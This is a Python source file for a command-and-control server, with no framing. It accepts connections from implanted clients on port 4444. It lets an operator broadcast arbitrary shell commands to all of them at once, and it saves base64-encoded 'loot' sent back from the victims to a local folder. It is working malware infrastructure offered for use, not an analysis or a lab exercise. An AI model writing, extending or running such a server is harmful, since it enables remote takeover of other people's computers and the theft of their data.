import socket
import threading
import json
import os
import base64
import hashlib
import time
from datetime import datetime

AES_KEY = hashlib.sha256(b"supersecretkey1234567890advanced").digest()[:16]

class C2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}
        self.client_mutex = threading.Lock()
        self.loot_dir = "loot"
        os.makedirs(self.loot_dir, exist_ok=True)
        print(f"[+] C2 Server listening on {host}:{port}")

    def recv_full(self, sock, length):
        """Receive exactly 'length' bytes"""
        data = b''
        while len(data) < length:
            chunk = sock.recv(4096)
            if not chunk:
                return None
            data += chunk
        return data

    def send_full(self, sock, data):
        """Send data completely"""
        try:
            length = len(data)
            sock.sendall(length.to_bytes(4, 'big'))
            sock.sendall(data)
            return True
        except:
            return False

    def handle_client(self, client_sock, addr):
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"[+] Client connected: {client_id}")
        
        with self.client_mutex:
            self.clients[client_id] = client_sock
        
        try:
            while True:
                # Receive length
                len_data = self.recv_full(client_sock, 4)
                if not len_data:
                    break
                msg_len = int.from_bytes(len_data, 'big')
                
                # Receive message
                msg_data = self.recv_full(client_sock, msg_len)
                if not msg_data:
                    break
                
                msg = json.loads(msg_data.decode())
                msg_type = msg.get('type', 'unknown')
                
                print(f"[+] Received from {client_id}: {msg_type}")
                
                if msg_type == 'heartbeat':
                    continue
                elif msg_type == 'shell_result':
                    print(f"[+] Shell result from {client_id}:")
                    print(msg.get('output', 'No output'))
                elif msg_type == 'loot':
                    self.save_loot(client_id, msg)
                
        except Exception as e:
            print(f"[-] Client {client_id} error: {e}")
        finally:
            with self.client_mutex:
                self.clients.pop(client_id, None)
            client_sock.close()
            print(f"[-] Client {client_id} disconnected")

    def broadcast(self, cmd):
        """Send command to all clients"""
        with self.client_mutex:
            for client_id, sock in list(self.clients.items()):
                try:
                    if self.send_full(sock, json.dumps(cmd).encode()):
                        print(f"[+] Sent to {client_id}")
                except:
                    print(f"[-] Failed to send to {client_id}")
                    self.clients.pop(client_id, None)

    def cli(self):
        while True:
            try:
                cmd = input("c2> ").strip()
                if cmd in ['quit', 'exit']:
                    break
                elif cmd == 'clients':
                    with self.client_mutex:
                        print(f"Connected clients: {len(self.clients)}")
                        for cid in self.clients:
                            print(f"  - {cid}")
                elif cmd == 'shell':
                    shell_cmd = input("shell> ")
                    self.broadcast({'type': 'shell', 'command': shell_cmd})
                elif cmd == 'info':
                    self.broadcast({'type': 'info'})
                else:
                    print("Commands: clients, shell, info, quit")
            except (KeyboardInterrupt, EOFError):
                break

    def save_loot(self, client_id, msg):
        try:
            loot_type = msg.get('loot_type', 'unknown')
            data_b64 = msg.get('data', '')
            filename = f"{client_id}_{loot_type}_{int(time.time())}.txt"
            filepath = os.path.join(self.loot_dir, filename)
            
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(data_b64))
            print(f"[+] Saved loot: {filepath}")
        except:
            pass

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(5)
        
        cli_thread = threading.Thread(target=self.cli, daemon=True)
        cli_thread.start()
        
        while True:
            try:
                client_sock, addr = sock.accept()
                t = threading.Thread(target=self.handle_client, args=(client_sock, addr), daemon=True)
                t.start()
            except KeyboardInterrupt:
                break
        
        sock.close()

if __name__ == "__main__":
    server = C2Server()
    server.start()